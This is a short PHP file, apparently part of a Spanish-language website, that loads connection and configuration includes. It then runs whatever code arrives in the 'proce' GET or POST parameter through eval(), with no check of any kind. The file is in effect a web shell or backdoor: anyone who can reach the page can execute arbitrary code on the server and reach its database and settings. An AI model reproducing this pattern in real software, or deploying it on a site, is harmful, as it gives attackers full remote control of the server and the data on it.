<?php     
    include("web.php");
    include("coneccion.php");
    include("Configuracion.php");
    
    $proce = $_GET['proce'];
    
  	if ( $proce == '' )
     	$proce = $_POST['proce'];
  
  	if ( $proce != '#' )
  	{
  	  eval(" $proce ");
  	  
  	}   
                    
?>
